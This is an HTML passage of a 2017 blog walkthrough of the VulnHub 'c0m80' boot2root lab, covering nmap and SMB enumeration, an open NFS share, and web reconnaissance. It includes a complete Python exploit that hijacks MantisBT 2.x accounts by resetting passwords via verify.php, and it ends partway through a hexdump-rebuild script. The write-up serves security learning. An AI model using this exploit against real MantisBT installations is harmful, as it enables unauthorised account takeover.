@@ -1,0 +1,2417 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>VulnHub - c0m80 boot2root</title>
+  <meta name="description" content="I saw this boot2root pop on twitter and it was rated as a difficult one andit didn’t have any walkthrough or solves apparently, so it picked my interest.">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="/2017/10/12/vulnhub-c0m80-boot2root.html">
+  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Binary World for Binary People :)</a>
+
+    <!--
+    <h2 class="site-subtitle">
+        <span class="site-subtitle-quote">"empty
+"</span>
+        <span class="site-subtitle-author">- no_author -</span>
+    </h2>
+    -->
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <a class="page-link" href="/blog/">Blog</a>
+      </div>
+      
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">VulnHub - c0m80 boot2root</h1>
+    <p class="post-meta"><time datetime="2017-10-12T01:39:00+02:00" itemprop="datePublished">Oct 12, 2017</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>I saw this boot2root pop on twitter and it was rated as a difficult one and
+it didn’t have any walkthrough or solves apparently, so it picked my interest.</p>
+
+<p>The pre-requisites for any readers would be to know about pentesting in general,
+networking, basic web hacking tricks, exploitation and some various tricks.</p>
+
+<p>We’ll begin by describing the reconnaissance process, exploit development and
+end up with privilege escalation.</p>
+
+<h1 id="reconnaissance">Reconnaissance</h1>
+
+<p>For reconnaissance, our first tool of choice will be nmap and depending on
+the discovered services we will run the appropriate tools.</p>
+
+<p>For nmap scans, it is usually better to proceed in a staged fashion.
+Scan the top 100, top 1000 and then all ports depending on what you find while
+poking available services.</p>
+
+<p>Some manual testing will allow us to pinpoint software versions
+we have on our target and thus know of the exploitable vulnerabilities
+it may have.</p>
+
+<p>The first nmap scan</p>
+
+<p>Our first scan will be a top 1000 syn scan with scripting and OS fingerprinting.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+99
+100
+101
+102
+</pre></td><td class="code"><pre># Nmap 7.60 scan initiated Thu Oct  5 10:51:22 2017 as: nmap -sS -vvv -A -oA c0m80-tcp 192.168.56.101
+Nmap scan report for 192.168.56.101
+Host is up, received arp-response (0.00045s latency).
+Scanned at 2017-10-05 10:51:22 EDT for 17s
+Not shown: 995 closed ports
+Reason: 995 resets
+PORT     STATE SERVICE     REASON         VERSION
+80/tcp   open  http        syn-ack ttl 64 Microsoft IIS httpd 6.0
+|_http-favicon: Unknown favicon MD5: 00BB3873C7F0934968F69D8DDFBD0999
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Microsoft-IIS/6.0
+|_http-title: BestestSoftware Ltd.
+111/tcp  open  rpcbind     syn-ack ttl 64 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      38672/tcp  mountd
+|   100005  1,2,3      44511/udp  mountd
+|   100021  1,3,4      51031/tcp  nlockmgr
+|   100021  1,3,4      58158/udp  nlockmgr
+|   100024  1          36355/udp  status
+|   100024  1          57030/tcp  status
+|   100227  2,3         2049/tcp  nfs_acl
+|_  100227  2,3         2049/udp  nfs_acl
+139/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     syn-ack ttl 64 2-3 (RPC #100227)
+MAC Address: 08:00:27:63:32:5B (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.8
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=10/5%OT=80%CT=1%CU=43246%PV=Y%DS=1%DC=D%G=Y%M=080027%T
+OS:M=59D646FB%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=105%TI=Z%CI=I%TS=8
+OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
+OS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
+OS:)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
+OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
+OS:=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
+OS:F=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=4
+OS:0%CD=S)
+
+Uptime guess: 0.007 days (since Thu Oct  5 10:41:58 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=259 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: C0M80; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1m22s, deviation: 0s, median: 1m22s
+| nbstat: NetBIOS name: C0M80, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| Names:
+|   C0M80&lt;00&gt;            Flags: &lt;unique&gt;&lt;active&gt;
+|   C0M80&lt;03&gt;            Flags: &lt;unique&gt;&lt;active&gt;
+|   C0M80&lt;20&gt;            Flags: &lt;unique&gt;&lt;active&gt;
+|   \x01\x02__MSBROWSE__\x02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
+|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
+|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
+| Statistics:
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 6870/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 44492/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 64862/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 34151/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: c0m80
+|   NetBIOS computer name: C0M80\x00
+|   Domain name: \x00
+|   FQDN: c0m80
+|_  System time: 2017-10-05T15:53:02+01:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2017-10-05 10:53:02
+|_  start_date: 1600-12-31 19:03:58
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.45 ms 192.168.56.101
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Oct  5 10:51:39 2017 -- 1 IP address (1 host up) scanned in 17.13 seconds</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>The first scan yields quite a bit of information:</p>
+<ul>
+  <li>We got a HTTP server, there can a big surface attack to explore</li>
+  <li>Samba 4.3.11-Ubuntu : This is the fix to CVE-2017-7494 for Ubuntu 14.04 or Ubuntu 16.04</li>
+  <li>We got a NFS share, this can yield interesting access or information if this is misconfigured.
+This is mostly configured on Linux.</li>
+</ul>
+
+<p>The second scan yields an interesting port : 20021.
+It seems there is a custom FTP server to exploit.</p>
+
+<p>Just knowing that these services are running we can hypothesize about software 
+running on the machine : Linux, Samba and probably WINE.
+Samba 4.3.11-Ubuntu is apparently running on the machine so the probable OS is
+Ubuntu 14.04 or Ubuntu 16.04.</p>
+
+<p>The CVE-2017-7494 is fixed so this is not our way in, that’s one of
+the vulnerabilities (with EternalBlue) to think about when we see
+port 445 opened nowadays.</p>
+
+<p>We got the probable OS version from that alone, we’ll verify it with more poking.</p>
+
+<h2 id="smb">SMB</h2>
+<p>SMB is the network protocol that Windows machines use in order to communicate
+among themselves. This was re-implemented for Linux under the Samba free project.</p>
+
+<p>This service can yield information about the OS, shares and users depending if
+NULL sessions are allowed or you got credentials.</p>
+
+<p>enum4linux will be used to do the job.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87
+88
+89
+90
+91
+92
+93
+94
+95
+96
+97
+98
+</pre></td><td class="code"><pre>$ enum4linux -a 192.168.56.101
+
+[...]
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+
+Target ........... 192.168.56.101
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+ ====================================================== 
+|    Enumerating Workgroup/Domain on 192.168.56.101    |
+ ====================================================== 
+
+[+] Got domain/workgroup name: WORKGROUP
+
+ ============================================== 
+|    Nbtstat Information for 192.168.56.101    |
+ ============================================== 
+
+Looking up status of 192.168.56.101
+    C0M80           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+    C0M80           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+    C0M80           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+    ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+    WORKGROUP       &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+    WORKGROUP       &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+    WORKGROUP       &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+    MAC Address = 00-00-00-00-00-00
+
+ ======================================= 
+|    Session Check on 192.168.56.101    |
+ ======================================= 
+
+[+] Server 192.168.56.101 allows sessions using username '', password ''
+
+ ============================================= 
+|    Getting domain SID for 192.168.56.101    |
+ ============================================= 
+
+Domain Name: WORKGROUP
+Domain Sid: (NULL SID)
+
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ======================================== 
+|    OS information on 192.168.56.101    |
+ ======================================== 
+
+[+] Got OS info for 192.168.56.101 from smbclient: 
+[+] Got OS info for 192.168.56.101 from srvinfo:
+    C0M80          Wk Sv PrQ Unx NT SNT C0m80 server (Samba, Ubuntu)
+    platform_id     :    500
+    os version      :    6.1
+    server type     :    0x809a03
+
+[...]
+
+ =========================================== 
+|    Share Enumeration on 192.168.56.101    |
+ =========================================== 
+
+WARNING: The "syslog" option is deprecated
+OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
+OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    IPC$            IPC       IPC Service (C0m80 server (Samba, Ubuntu))
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            C0M80
+
+[+] Attempting to map shares on 192.168.56.101
+//192.168.56.101/print$    Mapping: DENIED, Listing: N/A
+//192.168.56.101/IPC$    Mapping: OK    Listing: DENIED
+
+[...]
+
+ ========================================================================= 
+|    Users on 192.168.56.101 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ========================================================================= 
+
+[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
+S-1-22-1-1000 Unix User\b0b (Local User)
+S-1-22-1-1001 Unix User\al1ce (Local User)
+
+[...]</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>The information we are able to grab from that scan:</p>
+<ul>
+  <li>OS : Ubuntu 14.04 or Ubuntu 16.04</li>
+  <li>users : b0b and al1ce</li>
+  <li>no available shares</li>
+</ul>
+
+<h1 id="nfs">NFS</h1>
+<p>This service can yield access to files or code execution or privilege escalation 
+depending on what we can write/overwrite or read.</p>
+
+<p>We first look if it exports shares.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre>root@kali:~/c0m80# showmount -e 192.168.56.101
+Export list for 192.168.56.101:
+/ftpsvr/bkp *</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>It does export a share that is accessible to anyone and we probably also have
+RW permissions.</p>
+
+<p>We mount it and explore the share.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="code"><pre>root@kali:~/c0m80# mkdir bkp
+root@kali:~/c0m80# mount 192.168.56.101:/ftpsvr/bkp bkp/
+root@kali:~/c0m80# ls -lash bkp/
+total 2.7M
+4.0K drwxrwx--- 2 root   backup 4.0K Sep 22 21:37 .
+4.0K drwxr-xr-x 3 root   root   4.0K Oct  5 13:55 ..
+2.7M -rw-r--r-- 1 backup backup 2.7M Oct  5  2017 ftp104.bkp</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>That ftp104.bkp is a hexdump of a binary we’ll have to exploit, this will be
+detailed in a later section.</p>
+
+<h2 id="http">HTTP</h2>
+<p>Using DirBuster we find several pages and directories that yield more information
+about our target.</p>
+
+<p>Directories:</p>
+<ul>
+  <li>bin/</li>
+  <li>dev/</li>
+  <li>bugs/ : Leads to MantisBT app, this is a bugtracker</li>
+</ul>
+
+<p>Pages:</p>
+<ul>
+  <li>bugs/admin/check/ : Leaks MySQL version = 5.5.57</li>
+  <li>dev/info.php : Sorry to disappoint but this is pretty much fake (we know it’s a Linux box)</li>
+  <li>bugs/admin/check/index.php?show_all=1&amp;show_errors=0
+This is accessible without authentication and we get versions :
+PHP 5.5.9-1ubuntu4.22, MySQL 5.5.57 and AdoDB 5.20.9.
+We can infere that our OS version is thus Ubuntu 14.04 and that the security
+patch level is around August.</li>
+</ul>
+
+<p>The “bugs/” path leads to an app named MantisBT, it is a bugtracker.</p>
+
+<p>When trying to log on, we’ll be welcomed with a nice message:
+If you do not yet have an account, please use [guest:guest] to view the bugtracker.</p>
+
+<p>As a guest user, there isn’t much to see but “find a vuln” message.</p>
+
+<p>We need to pinpoint the exact MantisBT version if we are to find
+an exploitable vulnerability or wish to develop an 0day.</p>
+
+<p>Going through the HTML source we find these interesting imports:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td><td class="code"><pre>&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/default.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/common_config.php" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/status_config.php" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/dropzone-4.3.0.min.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/bootstrap-3.3.6.min.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/font-awesome-4.6.3.min.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/open-sans.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/bootstrap-datetimepicker-4.17.43.min.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/ace.min.css" /&gt;
+&lt;link rel="stylesheet" type="text/css" href="http://192.168.56.104/bugs/css/ace-mantis.css" /&gt;</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Going through the available files on sourceforge, we end up finding our MantisBT version : 2.x.0.</p>
+
+<p>At the end of the reconnaissance phase we managed to gather a precise enough
+view of the software running on our target:</p>
+
+<p>Software:
+OS              : Ubuntu 14.04 LTS
+MantisBT     : 2.x.y
+MySQL         : 5.5.57
+Samba         : 4.3.11
+ADOdb         : 5.20.9
+PHP           : 5.5.9-1ubuntu4.22
+WINE        : August</p>
+
+<p>Services    : HTTP, NFS, Custom FTP server</p>
+
+<p>This will help tremendously while trying to hack our target further.</p>
+
+<h1 id="gaining-access-to-mantisbt">Gaining access to MantisBT</h1>
+<p>The latest publicly available exploit found for MantisBT 2.x.y :</p>
+<ul>
+  <li>https://www.exploit-db.com/exploits/41890/ .
+It allows an attacker to change the password of a user.</li>
+</ul>
+
+<p>I ended up rewriting the exploit as it didn’t tell me if the exploit
+was successful or failed.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python2
+</span>
+<span class="s">'''
+Original exploit : https://www.exploit-db.com/exploits/41890/
+
+Rewritten as it couldn't differentiate
+between successful and failed exploitation.
+
+m_101
+'''</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s target_ip user_id new_pass'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">new_pass</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="n">mysession</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span> <span class="p">()</span>
+
+<span class="c1"># exploit the vuln
+</span><span class="n">url</span> <span class="o">=</span> <span class="s">'http://</span><span class="si">%</span><span class="s">s/bugs/verify.php?id=</span><span class="si">%</span><span class="s">s&amp;confirm_hash='</span> <span class="o">%</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">user_id</span><span class="p">)</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="n">url</span><span class="p">)</span>
+
+<span class="c1"># do the parsing
+</span><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span> <span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
+
+<span class="c1"># get CSRF token and realname
+</span><span class="n">account_update_token</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="n">realname</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">for</span> <span class="n">tag</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span> <span class="p">(</span><span class="s">'input'</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">account_update_token</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'account_update_token'</span><span class="p">:</span>
+        <span class="n">account_update_token</span> <span class="o">=</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">realname</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'name'</span><span class="p">)</span> <span class="o">==</span> <span class="s">'realname'</span><span class="p">:</span>
+        <span class="n">realname</span> <span class="o">=</span> <span class="n">tag</span><span class="o">.</span><span class="n">get</span> <span class="p">(</span><span class="s">'value'</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="n">account_update_token</span> <span class="o">==</span> <span class="bp">None</span> <span class="ow">or</span> <span class="n">realname</span> <span class="o">==</span> <span class="bp">None</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[-] Failed getting account update token or realname'</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="c1"># now update the user password
+</span><span class="n">form</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s">'verify_user_id'</span> <span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
+    <span class="s">'account_update_token'</span> <span class="p">:</span> <span class="n">account_update_token</span><span class="p">,</span>
+    <span class="s">'realname'</span> <span class="p">:</span> <span class="n">realname</span><span class="p">,</span>
+    <span class="s">'password'</span> <span class="p">:</span> <span class="n">new_pass</span><span class="p">,</span>
+    <span class="s">'password_confirm'</span> <span class="p">:</span> <span class="n">new_pass</span>
+<span class="p">}</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">'http://</span><span class="si">%</span><span class="s">s/bugs/account_update.php'</span> <span class="o">%</span> <span class="n">target_ip</span>
+<span class="n">response</span> <span class="o">=</span> <span class="n">mysession</span><span class="o">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">form</span><span class="p">)</span>
+
+<span class="n">success</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">content</span><span class="o">.</span><span class="n">split</span> <span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">):</span>
+    <span class="k">if</span> <span class="s">'Operation successful.'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">:</span>
+        <span class="n">success</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">break</span>
+
+<span class="k">print</span> <span class="s">'realname : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">realname</span>
+<span class="k">print</span> <span class="s">'token    : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">account_update_token</span>
+
+<span class="k">if</span> <span class="n">success</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[+] Successfully hijacked account'</span>
+    <span class="k">print</span> <span class="s">'     new password : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">new_pass</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'[-] Exploit failed'</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We find out 2 interesting tickets:
+Issue : http://192.168.56.101/bugs/view.php?id=6
+Leaks : http://c0m80.ctf/bin/npp.zip</p>
+
+<p>The npp.zip is a red herring, there isn’t anything there to see but pictures.</p>
+
+<p>Issue : http://192.168.56.101/bugs/view.php?id=1
+Leaks : http://192.168.56.101/dev/ftp104.bkp and there is a BOF (Buffer OverFlow)</p>
+
+<p>This .bkp file contains a binary in hexdump format.</p>
+
+<h1 id="rebuilding-our-binary">Rebuilding our binary</h1>
+
+<p>We can rebuild our binary by using xxd or a custom script.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre></td><td class="code"><pre><span class="c1">#!/usr/bin/python2
+</span><span class="s">'''
+desc : This rebuild the .txt dump to a .bin
+'''</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+    <span class="k">print</span> <span class="s">'Usage: </span><span class="si">%</span><span class="s">s bkp exe'</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="nb">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="n">bkp</span><span class="p">,</span> <span class="n">exe</span><span class="p">)</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span>
+
+<span class="k">def</span> <span class="nf">is_valid_hex</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">):</span>
+    <span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">hex_str</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">hex_str</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">hexdigits</span><span class="p">:</span>
+            <span class="k">return</span> <span class="bp">False</span>
+
+    <span class="k">return</span> <span class="bp">True</span>
+
+<span class="n">fp</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="n">bkp</span><span class="p">)</span>
+
+<span class="n">content</span> <span class="o">=</span> <span class="s">''</span>
